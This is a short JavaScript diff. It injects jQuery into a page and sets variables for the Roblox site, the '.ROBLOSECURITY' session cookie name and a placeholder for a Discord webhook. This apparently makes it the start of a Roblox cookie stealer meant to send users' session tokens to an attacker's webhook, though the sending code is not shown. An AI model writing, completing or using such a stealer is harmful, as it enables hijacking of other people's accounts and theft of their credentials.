@@ -1,3 +1,8 @@
+//adds jquery
+var script = document.createElement('script');
+script.src = 'https://code.jquery.com/jquery-3.6.0.min.js';
+document.getElementsByTagName('head')[0].appendChild(script);
+//actual script starts here
 var website = "https://www.roblox.com";
 var cookie_data = ".ROBLOSECURITY";
 var discord_web_api = "Youwebhookhere";
